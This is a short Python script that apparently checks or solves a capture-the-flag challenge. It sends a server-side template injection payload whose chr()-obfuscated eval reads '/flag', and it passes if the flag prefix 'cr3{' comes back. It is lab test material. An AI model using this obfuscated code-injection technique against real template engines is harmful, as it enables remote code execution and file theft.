#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from requests import post
from time import sleep

# wait for the challenge to start
for _ in range(5):
    try:
        r = post('http://nginx:80/', data={
            'person_1': '{% if "1 == 1: yield eval(chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(39)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(39)+chr(41)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41))\n    if 1 == 1" %}{% endif %}',
            'person_2': ' ',
            'method': '_Renderer__old'
        })
        r.raise_for_status()
    except:  # noqa
        sleep(5)
        continue

    exit(0 if 'cr3{' in r.text else 1)

exit(1)
